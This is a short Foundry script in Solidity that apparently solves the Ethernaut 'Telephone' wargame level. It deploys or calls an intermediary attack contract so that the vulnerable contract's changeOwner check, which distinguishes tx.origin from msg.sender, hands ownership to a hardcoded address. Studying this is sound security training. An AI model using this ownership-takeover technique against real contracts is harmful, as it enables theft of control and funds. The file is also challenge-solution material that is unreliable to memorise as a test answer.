// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../../src/Ethernaut/telephone.sol";

contract TelephoneAttack {
    Telephone public telephone;

    constructor(address _telephone) {
        telephone = Telephone(_telephone);
    }

    function changeOwner(address _newOwner) public {
        telephone.changeOwner(_newOwner);
    }
}

contract TelephoneScript is Script {
    TelephoneAttack public telephoneAttack =
        TelephoneAttack(0x471636e727902408E8b0826D4194873C9a9650ce);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        telephoneAttack.changeOwner(
            address(0xbd6AfFe91e36a4b9d4aa07F130A973B9282cA225)
        );
        // new TelephoneAttack(
        //     address(0x64Be546bA59876bfd447102F2Bb5b6e28eef2322)
        // );
        vm.stopBroadcast();
    }
}
